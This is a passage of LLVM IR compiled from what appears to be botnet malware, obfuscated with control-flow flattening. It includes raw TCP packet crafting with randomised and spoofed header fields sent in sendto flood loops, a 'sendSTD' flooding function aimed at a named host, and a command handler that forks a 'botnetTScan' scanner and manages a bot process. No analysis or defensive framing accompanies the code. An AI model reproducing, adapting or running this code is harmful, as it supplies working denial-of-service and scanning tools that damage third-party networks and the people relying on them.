  br label %loopEnd

; <label>:220:                                    ; preds = %loopEntry
  %221 = load i8*, i8** %23, align 8
  %222 = call i32 @strcmp(i8* %221, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.122, i32 0, i32 0)) #9
  %223 = icmp ne i32 %222, 0
  %224 = select i1 %223, i32 -2037122596, i32 -1742875975
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 0
  %228 = bitcast %union.anon* %227 to %struct.anon.0*
  %229 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = and i16 %230, -2049
  %232 = or i16 %231, 2048
  store i16 %232, i16* %229, align 4
  store i32 -2073298281, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* @switchCommStock, align 4
  %235 = load i8*, i8** %23, align 8
  %236 = call i32 (i32, i8*, ...) @botnetPrint(i32 %234, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.123, i32 0, i32 0), i8* %235)
  store i32 -2073298281, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 -267350149, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  store i32 -123020536, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 1082913859, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  store i32 -817295389, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i32 0, i32 0)) #3
  store i8* %242, i8** %23, align 8
  store i32 -489909740, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  store i32 483626097, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 0
  %249 = bitcast %union.anon* %248 to %struct.anon.0*
  %250 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %249, i32 0, i32 5
  store i16 %246, i16* %250, align 2
  %251 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 0
  %253 = bitcast %union.anon* %252 to %struct.anon.0*
  %254 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %253, i32 0, i32 6
  store i16 0, i16* %254, align 4
  %255 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %256 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %255, i32 0, i32 0
  %257 = bitcast %union.anon* %256 to %struct.anon.0*
  %258 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load i32, i32* %9, align 4
  %260 = icmp eq i32 %259, 0
  %261 = select i1 %260, i32 348853203, i32 879207992
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = call i32 @rand_cmwc()
  store i32 -867303469, i32* %switchVar
  store i32 %263, i32* %.reg2mem10
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %9, align 4
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #10
  %268 = zext i16 %267 to i32
  store i32 -867303469, i32* %switchVar
  store i32 %268, i32* %.reg2mem10
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %270 = trunc i32 %.reload11 to i16
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon* %272 to %struct.anon.0*
  %274 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %273, i32 0, i32 1
  store i16 %270, i16* %274, align 2
  %275 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %276 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %277 = call zeroext i16 @tcpcsum(%struct.iphdr* %275, %struct.tcphdr* %276)
  %278 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %279 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %278, i32 0, i32 0
  %280 = bitcast %union.anon* %279 to %struct.anon.0*
  %281 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %280, i32 0, i32 6
  store i16 %277, i16* %281, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %282 = bitcast i8* %.reload8 to i16*
  %283 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 2
  %285 = load i16, i16* %284, align 2
  %286 = zext i16 %285 to i32
  %287 = call zeroext i16 @csum(i16* %282, i32 %286)
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 7
  store i16 %287, i16* %289, align 2
  %290 = call i64 @time(i64* null) #3
  %291 = load i32, i32* %10, align 4
  %292 = sext i32 %291 to i64
  %293 = add nsw i64 %290, %292
  %294 = trunc i64 %293 to i32
  store i32 %294, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 1540094023, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  store i32 1685443831, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i32, i32* %17, align 4
  %298 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %299 = call i64 @sendto(i32 %297, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %298, i32 16)
  %300 = load i32, i32* %19, align 4
  %301 = call i32 @GRIP(i32 %300)
  %302 = call i32 @htonl(i32 %301) #10
  %303 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %304 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %303, i32 0, i32 8
  store i32 %302, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 3
  store i16 %306, i16* %308, align 4
  %309 = call i32 @rand_cmwc()
  %310 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 2
  store i32 %309, i32* %313, align 4
  %314 = call i32 @rand_cmwc()
  %315 = trunc i32 %314 to i16
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %316, i32 0, i32 0
  %318 = bitcast %union.anon* %317 to %struct.anon.0*
  %319 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %318, i32 0, i32 0
  store i16 %315, i16* %319, align 4
  %320 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 6
  store i16 0, i16* %323, align 4
  %324 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %325 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %326 = call zeroext i16 @tcpcsum(%struct.iphdr* %324, %struct.tcphdr* %325)
  %327 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %328 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %327, i32 0, i32 0
  %329 = bitcast %union.anon* %328 to %struct.anon.0*
  %330 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %329, i32 0, i32 6
  store i16 %326, i16* %330, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %331 = bitcast i8* %.reload6 to i16*
  %332 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 2
  %334 = load i16, i16* %333, align 2
  %335 = zext i16 %334 to i32
  %336 = call zeroext i16 @csum(i16* %331, i32 %335)
  %337 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 7
  store i16 %336, i16* %338, align 2
  %339 = load i32, i32* %25, align 4
  %340 = load i32, i32* %15, align 4
  %341 = icmp eq i32 %339, %340
  %342 = select i1 %341, i32 -896456347, i32 1800433241
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = call i64 @time(i64* null) #3
  %345 = load i32, i32* %24, align 4
  %346 = sext i32 %345 to i64
  %347 = icmp sgt i64 %344, %346
  %348 = select i1 %347, i32 1582882965, i32 873656869
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  store i32 1961018904, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 1540094023, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load i32, i32* %25, align 4
  %353 = add i32 %352, 1
  store i32 %353, i32* %25, align 4
  store i32 1540094023, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %355)
  store i32 -1715774196, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %354, %351, %350, %349, %343, %296, %295, %269, %264, %262, %244, %243, %241, %240, %239, %238, %237, %233, %225, %220, %212, %207, %199, %194, %186, %181, %173, %168, %164, %161, %125, %77, %71, %70, %66, %63, %57, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #3
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #3
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 1037757426, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1037757426, label %37
    i32 147835370, label %42
    i32 1679920814, label %57
    i32 -1239714814, label %60
    i32 357826649, label %61
    i32 1300914692, label %64
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @sendSTD.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  %41 = select i1 %40, i32 147835370, i32 357826649
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %7, align 4
  %44 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %45 = bitcast i8** %44 to i8*
  %46 = call i64 @send(i32 %43, i8* %45, i64 1460, i32 0)
  %47 = load i32, i32* %7, align 4
  %48 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %49 = call i32 @connect(i32 %47, %struct.sockaddr* %48, i32 16)
  %50 = call i64 @time(i64* null) #3
  %51 = load i64, i64* %8, align 8
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = add nsw i64 %51, %53
  %55 = icmp sge i64 %50, %54
  %56 = select i1 %55, i32 1679920814, i32 -1239714814
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %7, align 4
  %59 = call i32 @close(i32 %58)
  call void @_exit(i32 0) #12
  unreachable

; <label>:60:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 357826649, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %11, align 4
  %63 = add i32 %62, 1
  store i32 %63, i32* %11, align 4
  store i32 1037757426, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %61, %60, %42, %37, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #9
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1258231054, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1258231054, label %first
    i32 -2120875709, label %37
    i32 1322444791, label %44
    i32 -38068013, label %48
    i32 -38928592, label %49
    i32 -731436040, label %52
    i32 -1386665922, label %59
    i32 -1544682242, label %63
    i32 -2112323985, label %64
    i32 580655335, label %69
    i32 -1377185499, label %71
    i32 44946383, label %75
    i32 -1882843868, label %76
    i32 -1223420827, label %77
    i32 -321378965, label %80
    i32 -97498174, label %81
    i32 -454287019, label %88
    i32 -631282138, label %92
    i32 1029136365, label %99
    i32 821195427, label %106
    i32 -1346126873, label %113
    i32 956501501, label %120
    i32 856148085, label %127
    i32 1453588570, label %134
    i32 -252961896, label %141
    i32 -136778509, label %145
    i32 2050269384, label %152
    i32 -1906801145, label %153
    i32 539214542, label %176
    i32 -1028683652, label %181
    i32 -1257662494, label %182
    i32 997126437, label %186
    i32 -863839857, label %191
    i32 1022176284, label %192
    i32 -209611075, label %196
    i32 1926346032, label %201
    i32 396878187, label %202
    i32 1629480433, label %207
    i32 1238783001, label %210
    i32 -1523590967, label %214
    i32 -755352331, label %218
    i32 249977108, label %227
    i32 -172812117, label %229
    i32 -1676104356, label %230
    i32 -1206062277, label %234
    i32 1761761725, label %243
    i32 1753487897, label %244
    i32 -1777926568, label %245
    i32 -1688445231, label %252
    i32 -1868638908, label %256
    i32 -50609966, label %263
    i32 -1586616668, label %270
    i32 1605908572, label %277
    i32 -2034649631, label %284
    i32 622055072, label %288
    i32 -423398024, label %295
    i32 -965053246, label %299
    i32 540192990, label %306
    i32 1598323326, label %307
    i32 -1680731454, label %329
    i32 -1297572384, label %334
    i32 458075438, label %335
    i32 1614118996, label %339
    i32 -2060071844, label %344
    i32 298528811, label %345
    i32 2094075046, label %350
    i32 529220737, label %353
    i32 8449640, label %357
    i32 104388661, label %361
    i32 1116843514, label %369
    i32 1330654823, label %371
    i32 -1086659377, label %372
    i32 646199181, label %376
    i32 2065379651, label %384
    i32 1131971354, label %385
    i32 -432359136, label %386
    i32 1082329967, label %393
    i32 1681329342, label %397
    i32 -473571401, label %404
    i32 1863958306, label %411
    i32 -968831200, label %412
    i32 1660972625, label %416
    i32 755172887, label %417
    i32 -416839073, label %440
    i32 -57365951, label %447
    i32 -1707247287, label %451
    i32 -1999313277, label %458
    i32 -1922193240, label %465
    i32 840344656, label %466
    i32 876494975, label %482
    i32 -294001962, label %485
    i32 1334119309, label %489
    i32 -521727425, label %493
    i32 -1735473480, label %497
    i32 -1245373158, label %499
    i32 1559669210, label %500
    i32 -910484065, label %504
    i32 -1530003776, label %505
    i32 1889851286, label %509
    i32 -1593398547, label %510
    i32 -1343712919, label %517
    i32 -766693825, label %518
    i32 208124900, label %523
    i32 89660872, label %530
    i32 1102337616, label %538
    i32 767657516, label %546
    i32 -1263569800, label %547
    i32 1521506572, label %550
    i32 -68452959, label %551
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -97498174, i32 -2120875709
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 1
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -731436040, i32 1322444791
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* @botnetPid, align 4
  %46 = icmp eq i32 %45, 0
  %47 = select i1 %46, i32 -38068013, i32 -38928592
  store i32 %47, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* @botnetPid, align 4
  %51 = call i32 @kill(i32 %50, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  store i32 -731436040, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i8**, i8*** %4, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @strcmp(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0)) #9
  %57 = icmp ne i32 %56, 0
  %58 = select i1 %57, i32 -321378965, i32 -1386665922
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* @botnetPid, align 4
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 -1544682242, i32 -2112323985
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = call i32 @fork() #3
  store i32 %65, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp ugt i32 %66, 0
  %68 = select i1 %67, i32 580655335, i32 -1377185499
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  store i32 %70, i32* @botnetPid, align 4
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %5, align 4
  %73 = icmp eq i32 %72, -1
  %74 = select i1 %73, i32 44946383, i32 -1882843868
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 -1223420827, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %7, align 4
  %79 = load i32, i32* %6, align 4
  call void @botnetTScan(i32 %78, i32 %79)
  call void @_exit(i32 0) #12
  unreachable

; <label>:80:                                     ; preds = %loopEntry
  store i32 -97498174, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8**, i8*** %4, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  %84 = load i8*, i8** %83, align 8
  %85 = call i32 @strcmp(i8* %84, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.128, i32 0, i32 0)) #9
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -1777926568, i32 -454287019
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %3, align 4
  %90 = icmp slt i32 %89, 6
  %91 = select i1 %90, i32 2050269384, i32 -631282138
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 3
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @atoi(i8* %95) #9
  %97 = icmp eq i32 %96, -1
  %98 = select i1 %97, i32 2050269384, i32 1029136365
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8**, i8*** %4, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 2
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 @atoi(i8* %102) #9
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 2050269384, i32 821195427
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i8**, i8*** %4, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 4
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 @atoi(i8* %109) #9
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 2050269384, i32 -1346126873
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 5
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @atoi(i8* %116) #9
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 2050269384, i32 956501501
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 5
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #9
  %125 = icmp sgt i32 %124, 65536
  %126 = select i1 %125, i32 2050269384, i32 856148085
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8**, i8*** %4, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 5
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @atoi(i8* %130) #9
  %132 = icmp sgt i32 %131, 65500
  %133 = select i1 %132, i32 2050269384, i32 1453588570
  store i32 %133, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 4
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @atoi(i8* %137) #9
  %139 = icmp sgt i32 %138, 32
  %140 = select i1 %139, i32 2050269384, i32 -252961896
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i32, i32* %3, align 4
  %143 = icmp eq i32 %142, 7
  %144 = select i1 %143, i32 -136778509, i32 -1906801145
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 6
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #9
  %150 = icmp slt i32 %149, 1
  %151 = select i1 %150, i32 2050269384, i32 -1906801145
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 -68452959, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i8**, i8*** %4, align 8
  %155 = getelementptr inbounds i8*, i8** %154, i64 1
  %156 = load i8*, i8** %155, align 8
  store i8* %156, i8** %8, align 8
  %157 = load i8**, i8*** %4, align 8
  %158 = getelementptr inbounds i8*, i8** %157, i64 2
  %159 = load i8*, i8** %158, align 8
  %160 = call i32 @atoi(i8* %159) #9
  store i32 %160, i32* %9, align 4
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 3
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #9
  store i32 %164, i32* %10, align 4
  %165 = load i8**, i8*** %4, align 8
  %166 = getelementptr inbounds i8*, i8** %165, i64 4
  %167 = load i8*, i8** %166, align 8
  %168 = call i32 @atoi(i8* %167) #9
  store i32 %168, i32* %11, align 4
  %169 = load i8**, i8*** %4, align 8
  %170 = getelementptr inbounds i8*, i8** %169, i64 5
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 @atoi(i8* %171) #9
  store i32 %172, i32* %12, align 4
  %173 = load i32, i32* %3, align 4
  %174 = icmp sgt i32 %173, 6
  %175 = select i1 %174, i32 539214542, i32 -1028683652
  store i32 %175, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8**, i8*** %4, align 8
  %178 = getelementptr inbounds i8*, i8** %177, i64 6
  %179 = load i8*, i8** %178, align 8
  %180 = call i32 @atoi(i8* %179) #9
  store i32 -1257662494, i32* %switchVar
  store i32 %180, i32* %.reg2mem2
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 -1257662494, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %13, align 4
  %183 = load i32, i32* %3, align 4
  %184 = icmp sgt i32 %183, 7
  %185 = select i1 %184, i32 997126437, i32 -863839857
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i8**, i8*** %4, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 7
